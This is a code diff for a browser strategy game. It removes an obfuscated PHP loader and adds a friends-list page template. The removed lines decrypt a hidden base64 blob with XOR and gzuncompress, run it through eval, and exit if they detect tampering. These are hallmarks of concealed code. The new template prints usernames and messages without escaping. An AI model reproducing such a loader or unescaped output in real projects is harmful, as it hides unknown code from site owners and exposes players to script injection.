@@ -1,24 +1,73 @@
-<?php
-$hdehjsyfo="f689cb1a0cc771f8405925b6a923cc97";
-$piczhsfqqie="5e0f080f065054530000015551085e0b5106000d0257530e5500545656060f54";
-$kcbjrazrb="QOOdYL5AvhIgHo0umbgInokKAULji3oa8Sa0rF31bnqeMQS2uIg6bRTzHvP22oxNJ4aih4sFRqVaI7BFa8TTfuy0DRpas7N477xdw6vy/zyty2f+x8ol/Kw1EerNQOsH8DIKnxHXYa5cuftgL0DN70yRFu9WNadYePUcHTuT9bSkPkfz20e3S44/+jBlccvjDWNENT/313bi3fA+NO7Nragq3+L/mT8m7GgNTjEL0AU746d2cG1I9zl/2V2ASfU879L/jmr5j0LCPE6IKauCNIKS65LjSh+VjWwNqrBFbdth9lpouT70pl2FJNy6iHf//SgUwZeWCTJic2VMLH/ycwkRrBlx9GAK7rHruYi8GJXE/MXi5YHwAei9EgAofPWktzyXvTLVScPBBT40TFY8CuV4DcGCfOIYvhp4GF1CxFg7g1P1jhr/c04mxMA8dL7mY+0PRKnJuPXRl0glGmJB4nyWkXSKglUi2vnvKlY6OTXucr23O50fe1+tQo2pfchaD3VZ3Tl8cc9PdtaXVRNf81Np5YqYruf6AGkUR38jgur8CS/3AYPqqzMCAlxhZl7m6kXBMnKnix8621swPUiomxGrWZ6wLAc/plMdrxj7mRgqWhNNAwMVhYWoKGPjPNyhAAPWGTOhlBJCCibHFM0YAabpBBayDeyRMFAnouQuo5SDkGINLCV2fwd5zcWNQe1eS4nxPs1N+tQ8xlfrojUsY/cUsT22xqnGdb24U+I7HV1BYjWh5OjzHY8lti4/6J8yu1y6UN1jo1BUjyMi4BAP3olJd2g6TNBBXgvCOQNevY+ZSDogGwmIRPgEusGu4je/+a8nrCJ2Rb6XUtm+BpzG7PnY0En5l6LHZaQENbLlge12h7aMN/W7WA1pxNVHMbA2Y777/dNUGGgawuofJKNXqhhwWPhvWL/PY6oOysl4palOQqb9yJU2k1/ToIf4YvCery+9Uv4iVaiJXu74RKsVE+VrjGpkK0c8fTAu7sxN7VWeitjdSQ3E9coutuQa5Q==";
-$mihfgi=file_get_contents(__FILE__);
-$iqjrmqgdk=str_replace($kcbjrazrb,"",$mihfgi);
-if(strpos($iqjrmqgdk,"ec"."ho")!==false||strpos($iqjrmqgdk,"pr"."int")!==false||strpos($iqjrmqgdk,"var_"."dump")!==false||strpos($iqjrmqgdk,"file_put_"."contents")!==false||strpos($iqjrmqgdk,"fw"."rite")!==false){die();}
-$bvpivotf=str_replace(array($hdehjsyfo,$piczhsfqqie),array("SP_3103fbb4","KP_57438304"),$mihfgi);
-$zojzitizt=md5($bvpivotf);
-$votiqiyt=hex2bin($piczhsfqqie);
-$rkaktaeax="";
-$wwkmlg=strlen($zojzitizt);
-for($koslfqdsz=0;$koslfqdsz<$wwkmlg;$koslfqdsz++){
-$rkaktaeax.=chr(ord($votiqiyt[$koslfqdsz])^ord($zojzitizt[$koslfqdsz]));
-}
-$nbhnmos=base64_decode($kcbjrazrb);
-$usaobg=strlen($nbhnmos);
-$hphvhwom="";
-$quzfpydjx=strlen($rkaktaeax);
-for($koslfqdsz=0;$koslfqdsz<$usaobg;$koslfqdsz++){
-$hphvhwom.=$nbhnmos[$koslfqdsz]^$rkaktaeax[$koslfqdsz%$quzfpydjx];
-}
-$yoamleuhbam="gzun"."compress";
-eval('?>' . $yoamleuhbam($hphvhwom) . '<?php ');
+<?php if (!empty($error)): ?>
+    <div class="error"><?= $error ?></div>
+<?php endif; ?>
+<?php if (!empty($success)): ?>
+    <div class="success"><?= $success ?></div>
+<?php endif; ?>
+
+<h3><?= __('screens.profile.friends_title') ?></h3>
+
+<p><?= __('screens.profile.friends_description') ?></p>
+
+<table class="vis" width="100%">
+    <tr>
+        <th><?= __('screens.profile.name') ?></th>
+        <th><?= __('screens.profile.points') ?></th>
+        <th><?= __('screens.profile.villages') ?></th>
+        <th><?= __('screens.profile.tribe') ?></th>
+        <th><?= __('screens.profile.actions') ?></th>
+    </tr>
+    <?php if (!empty($friends)): ?>
+        <?php foreach ($friends as $friend): ?>
+            <tr>
+                <td>
+                    <a href="game.php?village=<?= $village['id'] ?>&screen=info_player&id=<?= $friend['id'] ?>">
+                        <?= $friend['username'] ?>
+                    </a>
+                </td>
+                <td><?= format_number($friend['points']) ?></td>
+                <td><?= format_number($friend['villages']) ?></td>
+                <td>
+                    <?php if ($friend['ally'] != 0 && !empty($friend['ally_short'])): ?>
+                        <a href="game.php?village=<?= $village['id'] ?>&screen=info_ally&id=<?= $friend['ally'] ?>">
+                            <?= htmlspecialchars($friend['ally_short']) ?>
+                        </a>
+                    <?php else: ?>
+                        -
+                    <?php endif; ?>
+                </td>
+                <td>
+                    <a
+                        href="game.php?village=<?= $village['id'] ?>&screen=friends&action=remove&id=<?= $friend['id'] ?>&h=<?= $hkey ?>"><?= __('screens.profile.remove') ?></a>
+                </td>
+            </tr>
+        <?php endforeach; ?>
+    <?php else: ?>
+        <tr>
+            <td colspan="5" align="center"><?= __('screens.profile.no_friends_found') ?></td>
+        </tr>
+    <?php endif; ?>
+</table>
+
+<br>
+
+<table class="vis" width="100%">
+    <tr>
+        <th colspan="2"><?= __('screens.profile.add_friend') ?></th>
+    </tr>
+    <tr>
+        <td colspan="2">
+            <form action="game.php?village=<?= $village['id'] ?>&screen=profile&mode=friends&action=add&h=<?= $hkey ?>"
+                method="post" style="display: inline;">
+                <input type="text" name="friend_name" placeholder="<?= __('screens.profile.player_name') ?>" size="20">
+                <input type="submit" value="<?= __('screens.profile.add') ?>" class="btn">
+            </form>
+            <span style="float: right; text-align: right;">
+                <?= __('screens.profile.friends_not_playing') ?><br>
+                <?= __('screens.profile.invite_to_help') ?><br>
+                <a
+                    href="game.php?village=<?= $village['id'] ?>&screen=profile&mode=invite"><b><?= __('screens.profile.invite_friends') ?></b></a>
+            </span>
+        </td>
+    </tr>
+</table>
